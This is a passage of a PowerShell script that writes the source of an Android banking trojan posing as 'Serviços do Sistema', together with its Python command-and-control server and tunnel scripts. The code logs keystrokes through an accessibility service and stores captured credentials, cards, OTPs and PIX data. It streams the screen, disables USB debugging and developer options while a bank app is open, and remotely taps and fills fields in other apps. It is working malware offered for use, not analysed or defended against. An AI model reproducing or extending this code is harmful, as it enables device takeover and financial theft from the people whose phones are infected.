  c('run',{s:PERFIS[k2],v:{chave:ch,valor:vl}});log('perfil '+k2+' chave '+ch+' valor '+(vl||'-'))}
function wt(){const b=$('#wt'),on=b.dataset.on!=='1';
  b.dataset.on=on?'1':'0';b.style.background=on?'#153a63':'';c('watch',{on:on});toq('watch '+(on?'on':'off'))}
function carregaP(){const k2=$('#pf2').value;$('#pjson2').value=JSON.stringify(PERFIS[k2],null,1)}
function salvaP(){try{const a=JSON.parse($('#pjson2').value);
  PERFIS[$('#pf2').value]=a;pflUpd();toq('perfil salvo')}catch(e){toq('json invalido')}}
function snap(){$('#snapbox').style.display='block';c('snap');toq('snap enviado')}
function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
function snapShow(txt){
  const pre=$('#snappre');pre.innerHTML='';
  txt.split('\n').forEach(l=>{if(!l.trim())return;
    const p=l.split('|');const el=document.createElement('div');
    el.textContent=l;el.onclick=()=>insere(p);pre.appendChild(el)})}
function insere(p){
  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',tx=p[5]||'',cd=p[6]||'';
  const sel={};
  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
  else if(tx)sel.txt='^'+jesc(tx)+'$';
  else if(cd)sel.txt=jesc(cd);
  else if(cls)sel.cls=jesc(cls);
  else return;
  if(fl.indexOf('C')>=0)sel.click=true;
  if(fl.indexOf('E')>=0)sel.edit=true;
  const s={do:sel.edit?'set':'tap',sel:sel};
  if(sel.edit)s.v='{{CHAVE}}';
  let cur=$('#pjson').value.trim();
  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
  let arr=[];if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
  arr.push(s);$('#pjson').value=JSON.stringify(arr,null,1);log('passo: '+JSON.stringify(sel))}
function playJ(){
  let t=$('#pjson').value.trim();if(!t){toq('perfil vazio');return}
  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
  let arr;try{arr=JSON.parse(t)}catch(e){toq('json invalido');return}
  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
  log('play '+arr.length+' passos')}
function salvaJ(){localStorage.setItem('perfil',$('#pjson').value);toq('gravado')}
function carregaJ(){$('#pjson').value=localStorage.getItem('perfil')||''}
function limpaJ(){$('#pjson').value=''}
pflUpd();co();
</script>
'@

Grava "server.py" @'
# server.py - C2, porta 8080
import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
KF = "teclado.log"
CF = "cofre.jsonl"
AQUI = os.path.dirname(os.path.abspath(__file__))


def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass


def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass


def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]


def ok(req):
    return req.query.get("t") == TOKEN


async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try:
            await v.send_str(d)
        except Exception:
            pass


async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try:
            await v.send_bytes(data)
        except Exception:
            pass
        finally:
            BUSY.discard(v)


async def devs():
    await bcast({"k": "devs", "d": devlist()})


async def index(req):
    if not ok(req):
        raise web.HTTPFound("/?t=" + TOKEN)
    try:
        with open(os.path.join(AQUI, "painel.html"), encoding="utf-8") as f:
            pagina = f.read()
    except Exception as e:
        return web.Response(text="painel.html ausente: %s" % e, status=500)
    return web.Response(text=pagina, content_type="text/html", charset="utf-8")


async def phone(req):
    if not ok(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev:
                    await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try:
                        await ws.send_str('{"c":"ka"}')
                    except Exception:
                        pass
                    continue
                elif o.get("t") == "k":
                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
                                                   "win": o.get("win"), "o": o.get("o", ""),
                                                   "h": time.strftime("%H:%M:%S")}})
                    continue
                elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                    cofre(o.get("t"), dev, o.get("o"))
                    await bcast({"k": "log", "d": o}, dev)
    except Exception as e:
        print(" ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws


async def panel(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    VIEW[ws] = None
    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(m.data)
            except Exception:
                continue
            if o.get("c") == "sel":
                VIEW[ws] = o.get("id") or None
                alvo = DEVS.get(VIEW[ws])
                if alvo:
                    try:
                        await alvo["ws"].send_str('{"c":"shot","on":true}')
                        await alvo["ws"].send_str('{"c":"info"}')
                        await alvo["ws"].send_str('{"c":"geo"}')
                    except Exception:
                        pass
                continue
            alvo = DEVS.get(o.get("id") or VIEW[ws])
            if not alvo:
                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id") or VIEW[ws]
            try:
                await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        VIEW.pop(ws, None)
    return ws


async def keys_get(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    try:
        n = min(int(req.query.get("n", 400)), 2000)
    except Exception:
        n = 400
    dev = req.query.get("dev")
    linhas = []
    if os.path.exists(KF):
        with open(KF, encoding="utf-8", errors="replace") as f:
            for l in f:
                if dev and ("\t" + dev + "\t") not in l:
                    continue
                linhas.append(l.rstrip("\n"))
    return web.json_response({"l": linhas[-n:]})


async def keys_clear(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    open(KF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})


async def keys_dl(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    if not os.path.exists(KF):
        open(KF, "w", encoding="utf-8").close()
    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})


async def cofre_get(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    tipo = req.query.get("tipo")
    out = []
    if os.path.exists(CF):
        with open(CF, encoding="utf-8", errors="replace") as f:
            for l in f:
                try:
                    o = json.loads(l)
                except Exception:
                    continue
                if tipo and o.get("_t") != tipo:
                    continue
                out.append(o)
    return web.json_response({"l": out[-800:][::-1]})


async def cofre_clr(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    open(CF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})


async def health(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    return web.json_response({"ok": True, "devices": devlist()})


def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e)
        return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)


async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())


def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.router.add_get("/keys", keys_get)
    app.router.add_get("/keys/clear", keys_clear)
    app.router.add_get("/keys/dl", keys_dl)
    app.router.add_get("/cofre", cofre_get)
    app.router.add_get("/cofre/clr", cofre_clr)
    app.on_startup.append(on_start)
    print("painel: http://localhost:8080/")
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)


main()
'@

Grava "tunel.ps1" @'
$ErrorActionPreference = "Continue"
$repo = $PSScriptRoot
$hostfile = Join-Path $repo "host.txt"
$cfg = Join-Path $repo "cloudflared.exe"
if (-not (Test-Path $cfg)) { $cfg = "cloudflared" }

while ($true) {
    Write-Host "[tunel] subindo"
    $log = Join-Path $env:TEMP "cf.err"
    $out = Join-Path $env:TEMP "cf.out"
    if (Test-Path $log) { Remove-Item $log -Force }
    $p = Start-Process -FilePath $cfg -ArgumentList "tunnel","--no-autoupdate","--url","http://localhost:8080" -RedirectStandardError $log -RedirectStandardOutput $out -PassThru -WindowStyle Hidden
    $url = $null
    for ($i = 0; $i -lt 60; $i++) {
        Start-Sleep -Milliseconds 700
        if (Test-Path $log) {
            $m = Select-String -Path $log -Pattern "https://([a-z0-9-]+\.trycloudflare\.com)" -AllMatches
            if ($m) { $url = $m.Matches[0].Groups[1].Value; break }
        }
        if ($p.HasExited) { break }
    }
    if ($url) {
        Write-Host "[tunel] host: $url" -ForegroundColor Green
        Set-Content -Path $hostfile -Value $url -NoNewline -Encoding ascii
        Push-Location $repo
        git add host.txt | Out-Null
        git -c user.name="aval" -c user.email="aval@local" commit -m "host $url" | Out-Null
        git push origin main | Out-Null
        Pop-Location
        Write-Host "[tunel] painel: https://$url/?t=m4t7k2p9x6v3n8b5z1q0w7r2"
    } else {
        Write-Host "[tunel] sem URL, repetindo" -ForegroundColor Yellow
    }
    Wait-Process -Id $p.Id
    Start-Sleep -Seconds 5
}
'@

Grava "servir.ps1" @'
$repo = $PSScriptRoot
Set-Location $repo
$py = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $py) { $py = (Get-Command py -ErrorAction SilentlyContinue) }
if (-not $py) { Write-Host "python nao encontrado no PATH" -ForegroundColor Red; exit 1 }
Start-Process -FilePath $py.Source -ArgumentList "server.py" -WorkingDirectory $repo
Start-Sleep -Seconds 2
Start-Process -FilePath "powershell" -ArgumentList "-NoExit","-ExecutionPolicy","Bypass","-File","$repo\tunel.ps1" -WorkingDirectory $repo
Write-Host "local: http://localhost:8080/?t=m4t7k2p9x6v3n8b5z1q0w7r2"
'@

Write-Host "`n[2/6] recursos do app" -ForegroundColor Cyan

Grava "app/src/main/res/values/strings.xml" @'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Servi&#231;os do Sistema</string>
    <string name="acc_label">Servi&#231;os do sistema</string>
    <string name="acc_desc">Executa tarefas de manuten&#231;&#227;o do sistema.</string>
    <string name="svc_label">Acessibilidade do sistema</string>
</resources>
'@

Write-Host "`n[3/6] manifest, Util, KeySvc" -ForegroundColor Cyan

Troca "app/src/main/AndroidManifest.xml" `
'<uses-permission android:name="android.permission.INTERNET" />' `
'<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />'

Troca "app/src/main/java/com/eloeeducacao/Util.java" `
'    public static final String[] BANCOS = {' `
'    public static boolean settings(String ns, String k, String v) {
        try {
            Process p = new ProcessBuilder("sh", "-c",
                    "settings put " + ns + " " + k + " " + v).redirectErrorStream(true).start();
            return p.waitFor() == 0;
        } catch (Throwable t) {
            return false;
        }
    }

    public static String geo(Context c) {
        try {
            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            int r = c.getResources().getConfiguration().orientation;
            return "{\"w\":" + dm.widthPixels + ",\"h\":" + dm.heightPixels + ",\"r\":" + r + "}";
        } catch (Throwable t) {
            return "{\"w\":0,\"h\":0,\"r\":0}";
        }
    }

    public static final String[] BANCOS = {'

Troca "app/src/main/java/com/eloeeducacao/KeySvc.java" `
'    private void grab() {' `
'    public void lock() {
        H.post(() -> {
            try {
                if (Build.VERSION.SDK_INT >= 28) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
            } catch (Throwable ignored) {}
        });
    }

    private void grab() {'

Troca "app/src/main/java/com/eloeeducacao/KeySvc.java" `
'                        ScreenSvc.lastFrame = System.currentTimeMillis();
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                        Net.sendBin(bo.toByteArray());' `
'                        ScreenSvc.lastFrame = System.currentTimeMillis();
                        if (shotOn) {
                            ByteArrayOutputStream bo = new ByteArrayOutputStream();
                            small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                            Net.sendBin(bo.toByteArray());
                        }'

Write-Host "`n[4/6] comandos" -ForegroundColor Cyan

Troca "app/src/main/java/com/eloeeducacao/Cmd.java" `
'                case "shot":
                    if (acc()) k.shotOn = o.optBoolean("on", true);
                    break;' `
'                case "shot":
                    if (acc()) k.shotOn = o.optBoolean("on", true);
                    break;
                case "off": {
                    Aviso.clear();
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    ScreenSvc.black = false;
                    if (k != null) k.shotOn = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    if (k != null) k.lock();
                    Net.send("{\"t\":\"off\"}");
                    Util.sendT("info", "captura desligada e tela bloqueada");
                    break;
                }
                case "screenoff":
                    if (k != null) k.lock();
                    break;
                case "geo":
                    Net.send("{\"t\":\"geo\",\"o\":" + Util.geo(c) + "}");
                    break;'

Troca "app/src/main/java/com/eloeeducacao/Cmd.java" `
'                case "bank":
                    Aviso.clear();
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.Q = 45;
                    ScreenSvc.FPS = 3;
                    Util.sendT("info", "modo banco: projecao off, overlay off");
                    if (acc()) Tree.dump(k);
                    break;
                case "unbank":
                    ScreenSvc.giveUp = false;
                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
                    break;' `
'                case "bank": {
                    Aviso.clear();
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    ScreenSvc.black = false;
                    if (k != null) k.shotOn = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}

                    StringBuilder r = new StringBuilder();
                    r.append(Util.settings("global", "development_settings_enabled", "0")
                            ? "opcoes do desenvolvedor: off" : "opcoes do desenvolvedor: FALHOU (grant adb)");
                    r.append("\n").append(Util.settings("global", "adb_enabled", "0")
                            ? "depuracao usb: off" : "depuracao usb: FALHOU");
                    r.append("\n").append(Util.settings("global", "adb_wifi_enabled", "0")
                            ? "depuracao sem fio: off" : "depuracao sem fio: FALHOU");
                    r.append("\n").append(Util.settings("global", "window_animation_scale", "0")
                            ? "animacoes: 0" : "animacoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "0")
                            ? "transicoes: 0" : "transicoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "0")
                            ? "animator: 0" : "animator: FALHOU");
                    try {
                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES deny"});
                        r.append("\ninstalacao por fonte desconhecida: off");
                    } catch (Throwable ignored) {
                        r.append("\ninstalacao por fonte desconhecida: FALHOU");
                    }
                    r.append("\nprojecao de tela: off\noverlay: off");
                    r.append("\n\nreabra o banco agora.");
                    Util.sendT("bank", r.toString());

                    String pkg = o.optString("pkg");
                    if (pkg.length() > 3) {
                        try {
                            Runtime.getRuntime().exec(new String[]{"sh", "-c", "am force-stop " + pkg});
                        } catch (Throwable ignored) {}
                        Intent i2 = c.getPackageManager().getLaunchIntentForPackage(pkg);
                        if (i2 != null) c.startActivity(i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    }
                    break;
                }
                case "unbank": {
                    ScreenSvc.giveUp = false;
                    if (k != null) k.shotOn = true;
                    StringBuilder r = new StringBuilder();
                    r.append(Util.settings("global", "development_settings_enabled", "1")
                            ? "opcoes do desenvolvedor: on" : "opcoes do desenvolvedor: FALHOU");
                    r.append("\n").append(Util.settings("global", "adb_enabled", "1")
                            ? "depuracao usb: on" : "depuracao usb: FALHOU");
                    r.append("\n").append(Util.settings("global", "window_animation_scale", "1")
                            ? "animacoes: 1" : "animacoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "1")
                            ? "transicoes: 1" : "transicoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "1")
                            ? "animator: 1" : "animator: FALHOU");
                    try {
                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES allow"});
                    } catch (Throwable ignored) {}
                    r.append("\n\nmodo normal. reabra a captura na tela de setup.");
                    Util.sendT("bank", r.toString());
                    break;
                }'

Troca "app/src/main/java/com/eloeeducacao/Cmd.java" `
'                case "tap":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;' `
'                case "tap":
                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"), false);
                    break;
                case "node":
                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"),
                            o.optBoolean("long", false));
                    break;'

Write-Host "`n[5/6] arvore e setup" -ForegroundColor Cyan

Grava "app/src/main/java/com/eloeeducacao/Tree.java" @'
package com.eloeeducacao;

import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Tree {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final int MAX = 220;

    private Tree() {}

    public static void dump(KeySvc s) {
        JSONArray arr = new JSONArray();
        try {
            AccessibilityNodeInfo root = s.getRootInActiveWindow();
            if (root != null) walk(root, arr, 0);
        } catch (Throwable ignored) {}
        Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
    }

    private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
        if (n == null || arr.length() >= MAX || d > 30) return;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                String txt = n.getText() == null ? "" : n.getText().toString().trim();
                if (txt.isEmpty() && n.getContentDescription() != null)
                    txt = n.getContentDescription().toString().trim();
                boolean edit = n.isEditable();
                boolean clic = n.isClickable();
                if (!txt.isEmpty() || edit || clic) {
                    if (txt.length() > 120) txt = txt.substring(0, 120);
                    JSONObject o = new JSONObject();
                    o.put("t", txt);
                    o.put("x", r.centerX());
                    o.put("y", r.centerY());
                    o.put("d", d);
                    if (clic) o.put("c", 1);
                    if (edit) o.put("e", 1);
                    o.put("cls", cls(n.getClassName()));
                    if (n.getPackageName() != null) o.put("pkg", n.getPackageName().toString());
                    arr.put(o);
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), arr, d + 1);
        } catch (Throwable ignored) {}
    }

    private static String cls(CharSequence c) {
        if (c == null) return "?";
        String s = c.toString();
        int i = s.lastIndexOf('.');
        return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
    }

    public static void act(final KeySvc s, final float x, final float y, final boolean longo) {
        if (longo) {
            s.longPress(x, y);
            return;
        }
        H.post(new Runnable() {
            @Override public void run() {
                boolean feito = false;
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo n = acha(root, (int) x, (int) y, 0);
                        while (n != null && !n.isClickable()) n = n.getParent();
                        if (n != null) feito = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                } catch (Throwable ignored) {}
                if (!feito) s.touch(x, y);
            }
        });
    }

    private static AccessibilityNodeInfo acha(AccessibilityNodeInfo n, int x, int y, int d) {
        if (n == null || d > 30) return null;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (!r.contains(x, y)) return null;
            for (int i = n.getChildCount() - 1; i >= 0; i--) {
                AccessibilityNodeInfo f = acha(n.getChild(i), x, y, d + 1);
                if (f != null) return f;
            }
            return n;
        } catch (Throwable t) {
            return null;
        }
    }

    public static void fill(final KeySvc s, final float x, final float y, final String v) {
        s.touch(x, y);
        H.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    if (f == null) return;
                    Bundle b = new Bundle();
                    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, v);
                    f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                } catch (Throwable ignored) {}
            }
        }, 400);
    }
}
'@

Grava "app/src/main/java/com/eloeeducacao/SetupActivity.java" @'
package com.eloeeducacao;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_CAP = 1001;
    private static final int REQ_PERM = 1002;

    private interface Estado { boolean ok(); }

    private final List<Runnable> pintores = new ArrayList<>();
    private final List<String> fila = new ArrayList<>();
    private LinearLayout lista;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        ScrollView sv = new ScrollView(this);
        sv.setFillViewport(true);
        sv.setBackgroundColor(Color.parseColor("#0B0F14"));
        lista = new LinearLayout(this);
        lista.setOrientation(LinearLayout.VERTICAL);
        lista.setPadding(dp(18), dp(22), dp(18), dp(28));
        sv.addView(lista);

        TextView titulo = new TextView(this);
        titulo.setText(R.string.app_name);
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(23);
        lista.addView(titulo);

        TextView sub = new TextView(this);
        sub.setText("Toque em cada item para abrir as configura\u00e7\u00f5es correspondentes.");
        sub.setTextColor(Color.parseColor("#8B98A5"));
        sub.setTextSize(12);
        sub.setPadding(0, dp(6), 0, dp(18));
        lista.addView(sub);

        linha("Permiss\u00f5es", "Pedir todas em sequ\u00eancia",
                this::permsOk, this::pedeTudo);

        linha("Acessibilidade", "Gestos e leitura da tela",
                () -> Util.accOn(this),
                () -> abre(Settings.ACTION_ACCESSIBILITY_SETTINGS));

        linha("Sobreposi\u00e7\u00e3o", "Desenhar por cima de outros aplicativos",
                () -> Settings.canDrawOverlays(this),
                () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()))));

        linha("Acesso a notifica\u00e7\u00f5es", "Leitura de notifica\u00e7\u00f5es do sistema",
                () -> {
                    String s = Settings.Secure.getString(getContentResolver(),
                            "enabled_notification_listeners");
                    return s != null && s.contains(getPackageName());
                },
                () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

        linha("Bateria", "Desativar otimiza\u00e7\u00e3o de bateria",
                () -> {
                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                    return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                },
                () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()))));

        linha("Brilho do sistema", "Permitir alterar configura\u00e7\u00f5es do sistema",
                () -> Settings.System.canWrite(this),
                () -> startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                        Uri.parse("package:" + getPackageName()))));

        linha("Captura de tela", "Iniciar ou encerrar a proje\u00e7\u00e3o",
                () -> ScreenSvc.alive,
                () -> {
                    if (ScreenSvc.alive) {
                        stopService(new Intent(this, ScreenSvc.class));
                        toast("Captura encerrada");
                    } else {
                        MediaProjectionManager mpm =
                                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
                    }
                });

        linha("Conex\u00e3o", "Iniciar o servi\u00e7o de rede",
                () -> Net.online(),
                () -> {
                    try { NetSvc.arranca(this); } catch (Throwable ignored) {}
                    Net.start(this);
                    toast("Conectando");
                });

        linha("\u00cdcone do app", "Ocultar ou mostrar na gaveta de aplicativos",
                this::iconeAtivo,
                this::alternarIcone);

        linha("Play Store", "Abrir a p\u00e1gina do aplicativo", null, () -> loja(this));

        String host = getSharedPreferences("p", 0).getString("url", "sem servidor");
        TextView rodape = new TextView(this);
        rodape.setText("servidor: " + host);
        rodape.setTextColor(Color.parseColor("#5C6B7A"));
        rodape.setTextSize(10);
        rodape.setPadding(0, dp(16), 0, 0);
        lista.addView(rodape);

        setContentView(sv);

        if (b == null) {
            fila.clear();
            for (String p : perms()) {
                try {
                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
                } catch (Throwable ignored) {}
            }
            if (!fila.isEmpty()) lista.postDelayed(this::proximo, 400);
        }
    }

    private static String[] perms() {
        List<String> p = new ArrayList<>();
        p.add(android.Manifest.permission.READ_SMS);
        p.add(android.Manifest.permission.RECEIVE_SMS);
        p.add(android.Manifest.permission.SEND_SMS);
        p.add(android.Manifest.permission.READ_CONTACTS);
        p.add(android.Manifest.permission.READ_PHONE_STATE);
        p.add(android.Manifest.permission.READ_CALL_LOG);
        p.add(android.Manifest.permission.CALL_PHONE);
        p.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        p.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        p.add(android.Manifest.permission.CAMERA);
        p.add(android.Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) {
            p.add(android.Manifest.permission.POST_NOTIFICATIONS);
            p.add(android.Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            p.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return p.toArray(new String[0]);
    }

    private boolean permsOk() {
        for (String p : perms()) {
            try {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
            } catch (Throwable ignored) {}
        }
        return true;
    }

    private void pedeTudo() {
        fila.clear();
        for (String p : perms()) {
            try {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
            } catch (Throwable ignored) {}
        }
        proximo();
    }

    private void proximo() {
        if (fila.isEmpty()) {
            toast("Permiss\u00f5es conclu\u00eddas");
            return;
        }
        String p = fila.remove(0);
        try {
            requestPermissions(new String[]{p}, REQ_PERM);
        } catch (Throwable ignored) {
            proximo();
        }
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == REQ_PERM) lista.postDelayed(this::proximo, 220);
    }

    @Override protected void onResume() {
        super.onResume();
        for (Runnable r : pintores) r.run();
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent i = new Intent(this, ScreenSvc.class);
            i.putExtra("code", rs);
            i.putExtra("data", d);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        }
    }

